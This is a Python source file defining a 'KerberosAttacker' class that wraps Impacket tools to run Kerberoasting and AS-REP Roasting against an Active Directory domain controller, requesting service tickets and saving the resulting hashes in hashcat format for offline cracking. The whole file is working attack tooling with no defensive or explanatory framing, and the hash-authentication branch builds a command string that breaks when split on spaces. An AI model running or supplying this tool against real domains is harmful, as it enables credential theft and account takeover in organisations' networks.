#!/usr/bin/env python3

import subprocess
import logging


class KerberosAttacker:
    '''Kerberos attack class wrapper'''
    
    # Impacket tools filepath cmds
    filepath_cmd = 'which impacket-GetUserSPNs'
    asreproast_cmd = 'which impacket-GetNPUsers'
    
    def __init__(self, domain, domain_controller, username=None, password=None, user_file=None, hashes=None):
        '''Init Kerberos attack utilities'''
        self.domain = domain
        self.dc = domain_controller
        self.username = username
        self.password = password
        self.user_file = user_file
        self.hashes = hashes
        
        # Build auth string based on available credentials
        if self.username and self.password:
            self.auth = f"{self.username}:{self.password}"
        elif self.hashes:
            self.auth = f"{self.username} -hashes {self.hashes}"
        else:
            self.auth = ""
    
    @classmethod
    def check_tools(cls):
        '''Check if required tools are installed'''
        tools_available = True
        
        try:
            subprocess.run(cls.filepath_cmd.split(' '), 
                shell=False,
                check=True,
                capture_output=True,
                text=True)
        except Exception as e:
            logging.error(f"Kerberoasting tool not found: {e}")
            tools_available = False
            
        try:
            subprocess.run(cls.asreproast_cmd.split(' '), 
                shell=False,
                check=True,
                capture_output=True,
                text=True)
        except Exception as e:
            logging.error(f"AS-REP Roasting tool not found: {e}")
            tools_available = False
            
        return tools_available
    
    def get_kerberoast_command(self, output_file=None):
        '''Get command string for Kerberoasting attack'''
        # Base command
        cmd = f"impacket-GetUserSPNs {self.domain}/{self.auth} -dc-ip {self.dc}"
        
        # Add request tickets option if output file provided
        if output_file:
            cmd += f" -request -outputfile {output_file}"
            
        return cmd
    
    def kerberoast(self, output_file=None):
        '''Perform Kerberoasting attack against domain'''
        
        # Get command
        cmd = self.get_kerberoast_command(output_file)
        cmdlst = cmd.split(' ')
        
        try:
            proc = subprocess.run(cmdlst,
                shell=False,
                check=False,
                capture_output=True,
                text=True)
        except Exception as e:
            logging.exception(e)
            return None
        else:
            # Debug print only
            logging.info(f'STDOUT:\n{proc.stdout}')
            logging.debug(f'STDERR:\n{proc.stderr}')
            
            return proc.stdout
    
    def get_asreproast_command(self, output_file=None):
        '''Get command string for AS-REP Roasting attack'''
        # Base command with domain and auth
        if self.user_file:
            cmd = f"impacket-GetNPUsers {self.domain}/ -usersfile {self.user_file} -dc-ip {self.dc}"
        else:
            cmd = f"impacket-GetNPUsers {self.domain}/{self.auth} -dc-ip {self.dc}"
            
        # Add format option if output file provided
        if output_file:
            cmd += f" -format hashcat -outputfile {output_file}"
            
        return cmd
    
    def asreproast(self, output_file=None):
        '''Perform AS-REP Roasting attack against domain'''
        
        # Get command
        cmd = self.get_asreproast_command(output_file)
        cmdlst = cmd.split(' ')
        
        try:
            proc = subprocess.run(cmdlst,
                shell=False,
                check=False,
                capture_output=True,
                text=True)
        except Exception as e:
            logging.exception(e)
            return None
        else:
            # Debug print only
            logging.info(f'STDOUT:\n{proc.stdout}')
            logging.debug(f'STDERR:\n{proc.stderr}')
            
            return proc.stdout
